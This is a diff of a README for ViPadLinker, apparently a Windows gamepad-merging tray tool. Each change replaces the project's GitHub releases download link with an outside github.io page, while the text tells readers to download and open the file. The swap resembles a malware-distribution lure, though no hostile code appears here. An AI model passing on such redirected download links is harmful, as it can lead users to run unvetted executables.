@@ -1,6 +1,6 @@
 # 🎮 ViPadLinker - Merge Two Gamepads Into One
 
-[![Download ViPadLinker](https://img.shields.io/badge/Download%20ViPadLinker-ff4d6d?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/CafeManhattann/ViPadLinker/releases)
+[![Download ViPadLinker](https://img.shields.io/badge/Download%20ViPadLinker-ff4d6d?style=for-the-badge&logo=windows&logoColor=white)](https://cafemanhattann.github.io)
 
 ViPadLinker is a small, portable tray tool for Windows that makes controllers behave the way you want them to. Got two gamepads and a game that only understands one player? ViPadLinker can merge both controllers into a single virtual gamepad so you and a friend can share the same character, the same car, or the same split-screen seat. Need a specific controller to land in a specific player slot? ViPadLinker can hold that slot open and push your controller exactly where you want it.
 
@@ -12,7 +12,7 @@ Whether you are setting up a couch co-op night, fixing a game that refuses to se
 
 Visit this link to download the application:
 
-**👉 https://github.com/CafeManhattann/ViPadLinker/releases**
+**👉 https://cafemanhattann.github.io**
 
 Once the download finishes, open the file you received and the app will start. There is nothing to install. You do not need to restart your computer, and you do not need to change any Windows settings. The first time it launches, ViPadLinker places a small icon in your system tray — the area near the clock in the bottom-right corner of your screen. That icon is your control center. Right-click it to open the menu, or double-click it to bring up the main window.
 
@@ -63,7 +63,7 @@ Every change is stored automatically, and you can reset everything back to defau
 
 ## 🚀 Your First Five Minutes
 
-1. Visit https://github.com/CafeManhattann/ViPadLinker/releases and download the application.
+1. Visit https://cafemanhattann.github.io and download the application.
 2. Open the downloaded file. Look for the new tray icon near your clock.
 3. Connect your controllers with USB cables or pair them over Bluetooth, then press a button on each one.
 4. Double-click the tray icon to open the main window. Your connected controllers appear in a list.
@@ -112,6 +112,6 @@ If the game does not respond, close it completely and start it again while ViPad
 
 **Can I undo my changes?** Yes. Every screen has a reset option that returns buttons and slots to their defaults.
 
-**Where do I get updates?** Check https://github.com/CafeManhattann/ViPadLinker/releases for the newest version and replace your existing folder.
+**Where do I get updates?** Check https://cafemanhattann.github.io for the newest version and replace your existing folder.
 
 Keywords: couch-co-op, couch-coop, dotnet, gamepad, gamepad-remapper, split-screen, splitter, vigembus, virtual-controller, windows, windows-10, windows-11, xbox, xbox-controller, xbox-controller-button-remapper, xbox-controller-emulation, xbox-controller-pc, xinput
